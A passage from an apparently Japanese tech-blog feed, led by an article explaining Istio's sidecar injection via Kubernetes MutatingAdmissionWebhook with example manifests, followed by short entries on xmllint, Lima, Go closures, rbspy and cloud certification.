etcdここで説明するフロー箇所(10) patch処理をコール(11) マニフェストを永続化クライアント ⬅︎ kube-apiserverここで説明するフロー箇所(12) コール完了を返信以降の仕組み05. おわりに記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4Fさて、前回の記事の時と同様に、最近の業務でもオンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、サービスメッシュを実装するIstioサイドカーインジェクションを記事で解説しました。解説するのは、執筆時点 (2023/01/14) 時点で最新の 1.14 系のIstioです。執筆時点 (2023/01/14) では、Istioが実装するサービメッシュには、『サイドカープロキシメッシュ』と『アンビエントメッシュ』があります。サイドカープロキシメッシュの仕組みの軸になっているものは、サイドカーコンテナであるistio-proxyコンテナです。Istioは、KubernetesのPodの作成時に、istio-proxyコンテナをPod内に自動的にインジェクション (注入) しますそれでは、もりもり布教していきます\uD83D\uDE1702. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかそもそも、なぜサービスメッシュが登場したのでしょうか。マイクロサービスアーキテクチャのシステムには、アーキテクチャ固有のインフラ領域の問題 (例：サービスディスカバリーの必要性、マイクロサービス間通信の暗号化、テレメトリー作成など) があります。アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装すれば、これらの問題の解決できます。しかし、アプリエンジニアはアプリ領域の問題に責務を持ち、インフラ領域の問題はインフラエンジニアで解決するようにした方が、互いに効率的に開発できます。そこで、インフラ領域の問題を解決するロジックをサイドカーとして切り分けます。これにより、アプリエンジニアとインフラエンジニアの責務を分離可能になり、凝集度が高くなります。また、インフラ領域の共通ロジックをサイドカーとして各マイクロサービスに提供できるため、単純性が高まります。こういった流れの中で、サービスメッシュが登場しました。servicemesh.es | Service Mesh ComparisonWhat is Service Mesh and why is it needed in Kubernetes?サービスメッシュのモデル前述の通り、サービスメッシュの登場前は、アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装していました。これを、『共有ライブラリモデル』と呼びます。その後、『サイドカーモデル』とも呼ばれるサイドカープロキシメッシュが登場しました。執筆時点 (2023/01/14) では、『カーネルモデル』とも呼ばれるサイドカーフリーメッシュが登場しています。サイドカープロキシメッシュIstioのサイドカーによるサービスメッシュ (サイドカープロキシメッシュ) は、サイドカーコンテナ (istio-proxyコンテナ) が稼働するデータプレーンサイドカーを中央集権的に管理するIstiod (discoveryコンテナ) が稼働するコントロールプレーンからなります。Istio / Architecture03. admission-controllersアドオンについてadmission-controllersアドオンとはIstioのPod内へのサイドカーインジェクションの前提知識として、admission-controllersアドオンを理解する必要があります。もし、admission-controllersアドオンをご存知の方は、 04. サイドカーインジェクションの仕組み まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍kube-apiserverでは、admission-controllersアドオンを有効化できます。有効化すると、認証ステップと認可ステップの後にmutating-admissionステップとvalidating-admissionステップを実行でき、admissionプラグインの種類に応じた処理を挿入できます。クライアント (kubectlクライアント、Kubernetesリソース) からのリクエスト (例：Kubernetesリソースに対する作成/更新/削除、kube-apiserverからのプロキシへの転送) 時に、各ステップでadmissionプラグインによる処理 (例：アドオンビルトイン処理、独自処理) を発火させられます。Admission Control in Kubernetes | KubernetesKubernetes Best Practices: Blueprints for Building Successful Applications on Kubernetesadmissionプラグインの種類admission-controllersアドオンのadmissionプラグインには、たくさんの種類があります。IstioがPod内にサイドカーをインジェクションする時に使用しているアドオンは、『MutatingAdmissionWebhook』です。CertificateApprovalCertificateSigningCertificateSubjectRestrictionDefaultIngressClassDefaultStorageClassDefaultTolerationSecondsLimitRanger\\"MutatingAdmissionWebhook\\" \uD83D\uDC48 これNamespaceLifecyclePersistentVolumeClaimResizePodSecurityPriorityResourceQuotaRuntimeClassServiceAccountStorageObjectInUseProtectionTaintNodesByConditionValidatingAdmissionWebhookAdmission Control in Kubernetes | KubernetesMutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはMutatingAdmissionWebhookプラグインを使用すると、mutating-admissionステップ時に、リクエスト内容を変更する処理をフックできます。フックする具体的な処理として、webhookサーバーにAdmissionRequestリクエストとして送信することにより、レスポンスのAdmissionResponseに応じてリクエスト内容を動的に変更します。MutatingWebhookConfigurationで、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を設定します。MutatingWebhookConfigurationの具体的な実装については、サイドカーインジェクションの仕組みの中で説明していきます。Diving into Kubernetes MutatingAdmissionWebhook | by Morven Cao | IBM Cloud | MediumKubernetes Admission Webhook覚書き - gashirar\'s blogAdmission Webhookを作って遊んで、その仕組みを理解しよう（説明編）AdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReviewAdmissionReviewは以下のようなJSONであり、kube-apiserverとwebhookサーバーの間でAdmissionRequestとAdmissionResponseを運びます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {},  # AdmissionResponse  \\"response\\": {},}v1 package - k8s.io/api/admission/v1 - Go Packages▼ AdmissionRequestAdmissionRequestは以下のようなJSONです。kube-apiserverがクライアントから受信した操作内容が持つことがわかります。例で挙げたAdmissionRequestでは、クライアントがDeploymentをCREATE操作するリクエストをkube-apiserverに送信したことがわかります。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"apps\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"deployments\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}Dynamic Admission Control | Kubernetes▼ AdmissionResponse一方でAdmissionResponseは、例えば以下のようなJSONです。AdmissionResponseは、マニフェスト変更処理をpatchキーの値に持ち、これはbase64方式でエンコードされています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"<value from request.uid>\\",      # 宛先のwebhookサーバーが受信したか否かを表す。      \\"allowed\\": true,      # PathによるPatch処理を行う。      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"W3sib3AiOiAiYWRkIiwgInBhdGgiOiAiL3NwZWMvcmVwbGljYXMiLCAidmFsdWUiOiAzfV0=\\",    },}エンコード値をデコードしてみると、例えば以下のようなpatch処理が定義されています。# patchキーをbase64方式でデコードした場合[{\\"op\\": \\"add\\", \\"path\\": \\"/spec/replicas\\", \\"value\\": 3}]マニフェストに対する操作 (op) 、キー (path) 、値 (value) が設定されています。kube-apiserverがこれを受信すると、指定されたキー (.spec.replicas) に値 (3) に追加します。Dynamic Admission Control | Kubernetes04. サイドカーインジェクションの仕組み全体のフロー前提知識を踏まえた上で、admission-controllersアドオンの仕組みの中で、サイドカーのistio-proxyコンテナがどのようにPodにインジェクションされるのかを見ていきましょう。最初に、サイドカーインジェクションのフローは以下の通りになっています。(画像はタブ開き閲覧を推奨)Istio in Action (English Edition)クライアント ➡︎ kube-apiserverここで説明するフロー箇所『クライアント ➡︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(1) Podの作成をリクエストまずは、クライアントがkube-apiserverにリクエストを送信するところです。クライアント (Deployment、DaemonSet、StatefulSet、を含む) は、Podの作成リクエストをkube-apiserverに送信します。この時のリクエスト内容は、以下の通りとします。# Podを作成する。$ kubectl apply -f foo-pod.yaml# foo-pod.yamlファイルapiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80またNamespaceでは、あらかじめistio-proxyコンテナのインジェクションが有効化されているとします。Istioではv1.10以降、リビジョンの番号のエイリアスを使用して、istio-proxyコンテナのインジェクションを有効化するようになりました。apiVersion: v1kind: Namespacemetadata:  name: foo-namespace  labels:    # istio-proxyコンテナのインジェクションを有効化する。    # エイリアスは自由    istio.io/rev: <エイリアス>Istio / Announcing Support for 1.8 to 1.10 Direct Upgrades▶ istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dkube-apiserver ➡︎ Serviceここで説明するフロー箇所『kube-apiserver ➡︎ Service』の箇所を説明します。(画像はタブ開き閲覧を推奨)(2) 認証/認可処理をコールkube-apiserverは、認証ステップと認可ステップにて、クライアントからのリクエストを許可します。(3) アドオンの処理をコールkube-apiserverは、mutating-admissionステップにて、MutatingAdmissionWebhookプラグインの処理をコールします。前提知識の部分で具体的な実装を省略しましたが、Istioのバージョン1.14.3時点で、MutatingWebhookConfigurationは以下のようになっています。Namespaceでサイドカーインジェクションを有効化する時に使用したエイリアスは、このMutatingWebhookConfigurationで実体のリビジョン番号と紐づいています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yamlapiVersion: admissionregistration.k8s.io/v1beta1kind: MutatingWebhookConfigurationmetadata:  name: istio-revision-tag-default  labels:    app: sidecar-injector    # エイリアスの実体    istio.io/rev: <リビジョン番号>    # リビジョン番号のエイリアス    istio.io/tag: <エイリアス>webhooks:  - name: rev.namespace.sidecar-injector.istio.io    # MutatingAdmissionWebhookプラグインの処理の発火条件を登録する。    rules:      - apiGroups: [\\"\\"]        apiVersions: [\\"v1\\"]        operations: [\\"CREATE\\"]        resources: [\\"pods\\"]        scope: \\"*\\"    # Webhookの前段にあるServiceの情報を登録する。    clientConfig:      service:        name: istiod-<リビジョン番号>        namespace: istio-system        path: \\"/inject\\" # エンドポイント        port: 443      caBundle: Ci0tLS0tQk ...    # Namespace単位のサイドカーインジェクション    # 特定のNamespaceでMutatingAdmissionWebhookプラグインの処理を発火させる。    namespaceSelector:      matchExpressions:        - key: istio.io/rev          operator: DoesNotExist        - key: istio-injection          operator: DoesNotExist    # Pod単位のサイドカーインジェクション    # 特定のオブジェクトでMutatingAdmissionWebhookプラグインの処理を発火させる。    objectSelector:      matchExpressions:        - key: sidecar.istio.io/inject          operator: NotIn          values:            - \\"false\\"        - key: istio.io/rev          operator: In          values:            - <エイリアス>    ...MutatingWebhookConfigurationには、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を定義します。MutatingAdmissionWebhookプラグインの発火条件に関して、例えばIstioでは、 NamespaceやPod.metadata.labelsキーに応じてサイドカーインジェクションの有効化/無効化を切り替えることができ、これをMutatingAdmissionWebhookプラグインで制御しています。webhookサーバーの宛先情報に関して、Istioではwebhookサーバーの前段にServiceを配置しています。MutatingAdmissionWebhookプラグインが発火した場合、Serviceの/inject:443にHTTPSプロトコルのリクエストを送信するようになっています。また、宛先のServiceの名前がistiod-<リビジョン番号>となっていることからもわかるように、Serviceは特定のバージョンのIstiodコントロールプレーンに対応しており、想定外のバージョンのIstiodコントロールプレーンを指定しないように制御しています。一方で発火しなかった場合には、以降のAdmissionReviewの処理には進みません。(4) AdmissionRequestに値を詰めるkube-apiserverは、mutating-admissionステップにて、クライアントからのリクエスト内容 (Podの作成リクエスト) をAdmissionReveiew構造体のAdmissionRequestに詰めます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"core\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"pods\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}(5) AdmissionReviewを送信kube-apiserverは、mutating-admissionステップにて、Serviceの/inject:443にAdmissionReview構造体を送信します。Service ➡︎ webhookサーバーここで説明するフロー箇所『Service ➡︎ webhookサーバー』の箇所を説明します。(画像はタブ開き閲覧を推奨)(6) 15017番ポートにポートフォワーディングServiceは、/inject:443でリクエストを受信し、discoveryコンテナの15017番ポートにポートフォワーディングします。Istioのバージョン1.14.3時点で、Serviceは以下のようになっています。$ kubectl get svc istiod-service -n istio-system -o yamlapiVersion: v1kind: Servicemetadata:  labels:    app: istiod  name: istiod-<リビジョン番号>  namespace: istio-systemspec:  type: ClusterIP  selector:    app: istiod    istio.io/rev: <リビジョン番号>  ports:    - name: grpc-xds      port: 15010      protocol: TCP      targetPort: 15010    - name: https-dns      port: 15012      protocol: TCP      targetPort: 15012    # webhookサーバーにポートフォワーディングする。    - name: https-webhook      port: 443      protocol: TCP      targetPort: 15017    - name: http-monitoring      port: 15014      protocol: TCP      targetPort: 15014.spec.selector.istio.io/revキーに、ポートフォワーディング先のPodを指定するためのリビジョン番号が設定されており、このPodはdiscoveryコンテナを持ちます。Istioは、discoveryコンテナ内でwebhookサーバーを実行し、15017番ポートでリクエストを待ち受けます。▶ istio.io/rev`discovery`コンテナの待ち受けポートについてdiscoveryコンテナがリクエストを待ち受けているポート番号を見てみると、15017番ポートでリッスンしていることを確認できます\uD83D\uDC4D$ kubectl exec foo-istiod -n istio-system -- netstat -tulpnActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 127.0.0.1:9876          0.0.0.0:*               LISTEN      1/pilot-discoverytcp6       0      0 :::15017                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::8080                 :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15010                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15012                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15014                :::*                    LISTEN      1/pilot-discoveryistio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubhttps://istio.io/latest/docs/ops/deployment/requirements/#ports-used-by-istiokube-apiserver ⬅︎ Service ⬅︎ webhookサーバー (※逆向きの矢印)ここで説明するフロー箇所『kube-apiserver ⬅︎ Service ⬅︎ webhookサーバー』の箇所を説明します。矢印が逆向きなことに注意してください。(画像はタブ開き閲覧を推奨)(7) patch処理を定義仕組みの中でも、ここは重要な部分です。discoveryコンテナ内のwebhookサーバーは、リクエスト内容を書き換えるためのpatch処理を定義します。webhookサーバーは、マニフェストの.spec.containers[1]パスにistio-proxyキーを追加させるようなpatch処理を定義します。この定義によって、結果的にサイドカーのインジェクションが起こるということになります。[  ...  {    \\"op\\": \\"add\\",    # .spec.initContainers[1] を指定する。    \\"path\\": \\"/spec/initContainers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-init\\",      \\"resources\\": {                     ...      }    }  },  {    \\"op\\": \\"add\\",    # .spec.containers[1] を指定する。    \\"path\\": \\"/spec/containers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-proxy\\",      \\"resources\\": {                     ...      }    }  }  ...]istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubistio/pkg/kube/inject/webhook_test.go at 1.14.3 \xb7 istio/istio \xb7 GitHubこの時、サイドカーのテンプレートに割り当てられた値が、patch処理を内容を決めます。type SidecarTemplateData struct {    TypeMeta             metav1.TypeMeta    DeploymentMeta       metav1.ObjectMeta    ObjectMeta           metav1.ObjectMeta    Spec                 corev1.PodSpec    ProxyConfig          *meshconfig.ProxyConfig    MeshConfig           *meshconfig.MeshConfig    Values               map[string]interface{}    Revision             string    EstimatedConcurrency int    ProxyImage           string}...istio/pkg/kube/inject/inject.go at 1.14.3 \xb7 istio/istio \xb7 GitHub▶ patch処理でインジェクションするコンテナについてistio-proxyコンテナの他に、InitContainerのistio-initコンテナもインジェクション可能にします。このistio-initコンテナは、Pod内にiptablesのルールを適用し、Podのインバウンド通信／アウトバウンド通信をistio-proxyコンテナにリダイレクトさせる責務を担います\uD83D\uDCAA\uD83C\uDFFBIstio Sidecar\'s interception mechanism for traffic - SoByte(8) AdmissionResponseに値を詰めるdiscoveryコンテナ内のwebhookサーバーは、patch処理の定義をAdmissionReveiew構造体のAdmissionResponseに詰めます。patchキーの値に、先ほどのpatch処理の定義をbase64方式でエンコードした文字列が割り当てられています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"*****\\",      \\"allowed\\": true,      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"<先ほどのpatch処理の定義をbase64方式でエンコードした文字列>\\",    },}istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHub(9) AdmissionReviewを返信discoveryコンテナ内のwebhookサーバーは、AdmissionReview構造体をレスポンスとしてkube-apiserverに返信します。kube-apiserver ➡︎ etcdここで説明するフロー箇所『kube-apiserver ➡︎ etcd』の箇所を説明します。(画像はタブ開き閲覧を推奨)(10) patch処理をコールkube-apiserverは、AdmissionReview構造体を受信し、AdmissionResponseに応じてリクエスト内容を書き換えます。patch処理の定義をAdmissionReview構造体から取り出し、クライアントからのリクエスト内容を書き換えます。具体的には、istio-proxyコンテナとistio-initコンテナを作成するために、リクエストしたマニフェストの該当箇所にキーを追加します。apiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80    # kube-apiserverが追加    - name: istio-proxy      ...  # kube-apiserverが追加  initContainers:    - name: istio-init    ...(11) マニフェストを永続化kube-apiserverは、etcdにPodのマニフェストを永続化します。クライアント ⬅︎ kube-apiserverここで説明するフロー箇所『クライアント ⬅︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(12) コール完了を返信kube-apiserverは、クライアントにレスポンスを受信します。$ kubectl apply -f foo-pod.yaml# kube-apiserverからレスポンスが返ってくるpod \\"foo-pod\\" created以降の仕組み(画像はタブ開き閲覧を推奨)kube-apiserverは、他のNodeコンポーネント (kube-controlleretcd、kube-scheduler、kubeletなど) と通信し、Podを作成します。このPodのマニフェストは、アプリコンテナの他に、istio-proxyコンテナとistio-initコンテナを持ちます。結果として、サイドカーコンテナのistio-proxyコンテナをインジェクションしたことになります。▶ kube-apiserverと他コンポーネントの通信についてKubernetes Master Components: Etcd, API Server, Controller Manager, and Scheduler | by Jorge Acetozi | jorgeacetozi | Medium05. おわりにサービスメッシュの登場とIstioのサイドカーインジェクションの仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。今回登場したMutatingAdmissionWebhookプラグインに関して、私の関わっているプロダクトではIstio以外 (例：CertManager、Prometheus、AWSのaws-eks-vpc-cniアドオンなど) でも使用しています✌️そのため、MutatingAdmissionWebhookプラグインをどのように使っているのかを一度知れば、知識の汎用性が高いと考えています。サイドカーインジェクションはIstioでも基本的な機能であり、もし未体験の方がいらっしゃれば、お手元でサイドカーコンテナが追加されることを確認していただくとよいかもしれません\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2023-01-14T13:38:15.000Z","dateMiliSeconds":1673703495000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"xmllint で HTML 内の任意の値を取り出す","link":"https://blog.1q77.com/2023/01/xmllint-html-xpath/","contentSnippet":"サクッと shell script で HTML の中の何かを取り出したい時があります。そんな時に使えるのが xmllint.しっかりやるなら python の Beautiful Soup を使ったりしますが、本当に簡単なことを簡単にやりたい場合に xmllint でサクッとやったメモ。","isoDate":"2023-01-12T14:40:51.000Z","dateMiliSeconds":1673534451000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"ぼちぼちブログでもはじめます","link":"https://moz-security.hatenablog.com/entry/2023/01/04/111143","contentSnippet":"もう新年始まって気づいたら４日目ですが、明けましておめでとうございます。アウトプットの場として2023年になり、気持ちを新たにして、なにか新しいことを始めようと思ったときに、前々からいつかやろうと思っていたブログを書くことに決めました。（いつかやろうを今やることは大事だと思う。）ここらへんで、一応、自己紹介しておきたいと思います。私は、現在、大学で情報理工学を学んでいて、ネットワークやセキュリティに興味を持っています。今までやってきたこととしては、B2のときに基本情報技術者試験、B3のときに応用情報技術者試験に合格し、他には、セキュリティ・ミニキャンプ オンライン・東京 に参加したり、Hack The Boxを少しずつやってきました。（秋学期になってからHTBはほとんど触れていないが…）他にも、いろんな勉強会にも参加してきました。今はオンラインで気軽に参加できるので。ブログを書こうかなと考えた理由は大きく３つありまして。１つ目は、セキュリティ・ミニキャンプのグループ活動でLT大会をしたときに、やっぱりアウトプットの場というのがあることで、より知識の定着につながることが実感できたからです。大学生になってからは、インプットがメインになっていてアウトプットの場がなかなかないため、どうアウトプットするのかというのは考える必要がありました。Twitterでもアウトプットはできるし、実際にそれを使っていましたが、文字数に制限があるため、正しく文章を書くには向いていません。（気楽にツイートできることがTwitterの良さではあるのですが。）２つ目は、自分の言語化能力の向上のためです。自分の頭には考えがあるのに、それをうまく伝えられなかったり、わかりにくい説明になっていたりしていたため、どうすればわかりやすく説明できるのかというのは前からの悩みでした。そこでいろいろ考えたときに自分の頭にあることを言語化するというのは、結構慣れの要素が大きいと思うため、経験を積むことが大事だという結論にいたり、それならば、早く始めた方がいいというのが、ブログを書くきっかけにもなっています。３つ目は、エンジニアになるなら、自分の技術力（今までどんなことをやってきたのか、私はどんなことができるのか）を証明するためにも技術ブログは書いておくといいということを聞くことが多いからです。今は、いきなり技術ブログを書くのは敷居が高いため、気楽に書けるこのHatena Blogでしか記事を書いていませんが、今年中には、QitaやZennの方に、技術系の記事を投稿していきたいと思っています。ブログを書く前に、Hatena Blogを使うかも結構迷っていて、自分で個人ブログサイトを作ろうかとも思ったのですが、そこに時間をかける前にさっさとブログを書き始めようということで、こちらを選択しました。そのため、今年中には、個人のブログサイトを作ってそちらに移行したいと思っています。（願望）このHatena Blogでは、月に１回は投稿していく予定です。内容としては、その月にやってきたこととか新たな発見があったこと、自分の書きたいことを勝手に発信していく感じで。ここであらかじめ宣言しておくことで、自分を追い込んでいくスタイル。（笑）技術的な話は、QiitaやZennの方に書くかもしれませんが、もしかしたら、こっちで書くかもしれません。全然考えていないため、そこら辺はこれから考えていきたいと思います。とりあえず、人生初めてのブログは、こんな感じで終わりたいと思います。近々、新年の抱負として、今年やりたいことを書きたいと思っています。","isoDate":"2023-01-04T02:11:43.000Z","dateMiliSeconds":1672798303000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Lima の vmType VZ と virtiofs を試す","link":"https://blog.1q77.com/2022/12/lima-vz/","contentSnippet":"Lima が version 0.14.0 で QEMU だけではなく macOS の Virtualization.Framework に対応していました。vmtype という設定項目が増えています。この新しい Framework では Host のディレクトリをマウントするのに virtiofs が使えるようになっており、QEMU での reverse-sshfs や 9p よりもパフォーマンスが良いらしいので試してみます。","isoDate":"2022-12-29T15:49:47.000Z","dateMiliSeconds":1672328987000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"クロージャーのメモリ割り当てについて(Go言語)","link":"https://kechigon.hatenablog.com/entry/2022/12/29/203946","contentSnippet":"A Tour of GoでGo言語に入門していて、クロージャーのメモリ割り当てについて疑問に思ったので調べた。クロージャーとはA Tour of Go での説明をまとめると、本体の外部から変数を参照する関数値関数は、参照した変数にアクセスして割り当てることができるという特徴がある。サンプルコードpackage mainimport \\"fmt\\"func adder() func() int {    sum := 0    return func() int {        sum++        return sum    }}func main() {    f := adder()    for i := 0; i < 10; i++ {        fmt.Println(f())    }}出力12345678910adder 関数はクロージャーを返し、各クロージャーは、sum 変数にバインドされている。疑問点サンプルコードではクロージャーが、adder関数で定義されたsum変数を参照、割り当てしてる。しかし、関数呼び出しといえばスタックフレームを用いるイメージしかない私にとっては、sum変数の参照がどこに残っているのか疑問。おそらくヒープ領域に割り当てられてる？GitHub issue でのやり取り調べたところ、同じ疑問に答えているissueを見つけた。質問者は、同じような処理をクロージャーを使用する場合と使用しない場合で試している。そして、クロージャーを使用した場合だとヒープ領域への割り当てが行われると言っている。実際のコードpackage mainimport (    \\"fmt\\"    \\"sync\\"    \\"testing\\")type Object struct {}var p sync.Pool = sync.Pool{    New: func() interface{} {        return &Object{}    },}type Func struct {    ctx interface{}}func (this *Func) Run() {    p.Put(this.ctx)  }func RunWithFunc() Func {    ctx := p.Get()    return Func{ctx: ctx}}func RunWithClosure() func() {    ctx := p.Get()    return func() { p.Put(ctx) }}func Test1() {    cleanup := RunWithFunc()    cleanup.Run()}func Test2() {    cleanup := RunWithClosure()    cleanup()}func main() {    f1 := testing.AllocsPerRun(1000, Test1)    f2 := testing.AllocsPerRun(1000, Test2)    // 0    fmt.Println(f1)    // 1    fmt.Println(f2)}コードの詳しい内容は、クロージャーを使わないRunWithFuncと使用するRunWithClosureを実行する。どちらも大雑把に言うと、空の構造体をsync.Poolから取り出したり戻したりする。クロージャーを使うとヒープ領域への割り当てが行われることをtesting.AllocsPerRunが示す。といった感じ。回答者は以下のように言っている。問題は、RunWithClosure がクロージャーを返す必要があることです。関数が実行される前にスタック フレームがなくなるため、スタックに割り当てることができません。 可能な場合は、スタックにクロージャーを割り当てます。スタック上にクロージャ（これらの2つのフィールドの匿名構造体）を割り当て、呼び出された関数にそれらへのポインタを渡すことができますし、実際に行っています。ここでの問題は、その構造体がRunWithClosureの内部で割り当てられ、RunWithClosureのフレームは、cleanupを呼び出すまでになくなってしまうことです。そのため、RunWithClosureのフレームでクロージャを割り当てることはできません。それは、ヒープ上に割り当てられなければなりません。もし、RunWithClosureをその呼び出し元にインライン化すれば、そのスタック・フレームが十分に長く生きるので、呼び出し元でクロージャを割り当てることができるようになります。クロージャーが実行される前に、参照先をもつスタックフレームがなくなってしまう場合、それをヒープ領域に割り当てるらしい。またそれを避けたい場合は、関数になっている部分をインライン化するといいらしい。まとめGo言語に入門していて、クロージャーが参照している変数がどこに残っているか疑問に思ったが、GitHub issueのやり取りから、予想した通り、ヒープ領域への割り当てが行われていることがわかった。","isoDate":"2022-12-29T11:39:46.000Z","dateMiliSeconds":1672313986000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"rbspy で ruby の stacktrace を flamegraph にする","link":"https://blog.1q77.com/2022/12/rbspy/","contentSnippet":"中身をよく知らない Rails アプリでどこが遅いのかな？と思って rbspy (github) を試してみたのでメモ。とりあえず使って flamegraph を書き出してみたんだけどそもそも flamegraph がどういうものなのか分かってなくて困ったのでドキュメントを読んでみた。","isoDate":"2022-12-28T11:26:10.000Z","dateMiliSeconds":1672226770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Professional Cloud Security Engineer の振り返り","link":"https://qiita.com/dirtymosschan/items/2c66eec7919220a4ec06","contentSnippet":"はじめに2022/12/28 に Google Cloud Certification の１つである、Professional Cloud Security Engineer に合格したので、そちらの振り返りをしようと思います。こちらの記事では、出題内容の詳細は記載し...","isoDate":"2022-12-28T08:57:17.000Z","dateMiliSeconds":1672217837000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"【Istio⛵️】Istioのサービス間通信を実現するサービスディスカバリーの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/25/060000","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️サービスディスカバリーの種類についてIstioのサービス間通信を実現するサービスディスカバリーの仕組みについて記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとはなぜサービスディスカバリーが必要なのかサービスディスカバリーの要素サービスディスカバリーのパターンサービスディスカバリーのパターンとはサーバーサイドパターンクライアントサイドパターン03. Istioのサービスディスカバリーの仕組み全体像(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるロードバランシングdiscoveryコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるリクエスト受信04. istio-proxyコンテナ内のEnvoyの仕組み全体像(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるエンドポイント選択(6) 宛先マイクロサービスへのリクエスト送信EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイントリスナー▼ 確認方法▼ 結果ルート▼ 確認方法▼ 結果クラスター▼ 確認方法▼ 結果エンドポイント▼ 確認方法▼ 結果Envoyの処理の流れのまとめ(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるクラスター選択(6) 宛先マイクロサービスへのリクエスト送信05. おわりに謝辞記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F3-shake Advent Calender 2022 最終日の記事です\uD83C\uDF85普段、私は 俺の技術ノート 